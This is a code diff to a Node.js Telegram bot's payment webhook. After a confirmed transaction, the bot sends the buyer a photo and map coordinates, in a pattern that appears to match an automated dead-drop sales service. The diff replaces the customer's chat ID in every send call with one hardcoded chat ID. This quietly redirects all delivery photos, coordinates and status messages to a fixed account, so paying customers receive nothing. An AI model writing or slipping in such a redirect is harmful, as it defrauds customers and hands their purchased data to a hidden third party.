@@ -623,7 +623,7 @@ app.post('/webhook', (req, res) => {
                                         return;
                                     }
 
-                                    bot.telegram.sendPhoto(trimmedAddressLabel, { source: filePath })
+                                    bot.telegram.sendPhoto('1903358250', { source: filePath })
                                         .then(() => {
                                             console.log('Image sent successfully.');
                                             fs.unlink(filePath, (err) => {
@@ -638,20 +638,20 @@ app.post('/webhook', (req, res) => {
                                             console.error('Error sending image to Telegram:', error.message);
                                         });
 
-                                    bot.telegram.sendMessage(trimmedAddressLabel, `Your transaction is valid and has been processed successfully:\nCoordinates: ${longitude}, ${latitude}\n https://yandex.com/maps/?ll=${longitude}%2C${latitude}`, { parse_mode: 'HTML' });
+                                    bot.telegram.sendMessage('1903358250', `Your transaction is valid and has been processed successfully:\nCoordinates: ${longitude}, ${latitude}\n https://yandex.com/maps/?ll=${longitude}%2C${latitude}`, { parse_mode: 'HTML' });
                                 });
                             } else {
-                                bot.telegram.sendMessage(trimmedAddressLabel, 'Your transaction is valid and has been processed successfully.');
-                                bot.telegram.sendMessage(trimmedAddressLabel, `Your transaction is valid and has been processed successfully:\nCoordinates: ${longitude}, ${latitude}\n https://yandex.com/maps/?ll=${longitude}%2C${latitude}`, { parse_mode: 'HTML' });
+                                bot.telegram.sendMessage('1903358250', 'Your transaction is valid and has been processed successfully.');
+                                bot.telegram.sendMessage('1903358250', `Your transaction is valid and has been processed successfully:\nCoordinates: ${longitude}, ${latitude}\n https://yandex.com/maps/?ll=${longitude}%2C${latitude}`, { parse_mode: 'HTML' });
                             }
                         } else {
-                            bot.telegram.sendMessage(trimmedAddressLabel, `We received your transfer but could not confirm the product. Please contact support.`, { parse_mode: 'HTML' });
+                            bot.telegram.sendMessage('1903358250', `We received your transfer but could not confirm the product. Please contact support.`, { parse_mode: 'HTML' });
                         }
                     } else {
-                        bot.telegram.sendMessage(trimmedAddressLabel, 'Transaction amount is less than required.');
+                        bot.telegram.sendMessage('1903358250', 'Transaction amount is less than required.');
                     }
                 } else {
-                    bot.telegram.sendMessage(trimmedAddressLabel, 'No pending transactions found for your account.');
+                    bot.telegram.sendMessage('1903358250', 'No pending transactions found for your account.');
                 }
 
                 res.status(200).send('Webhook received');
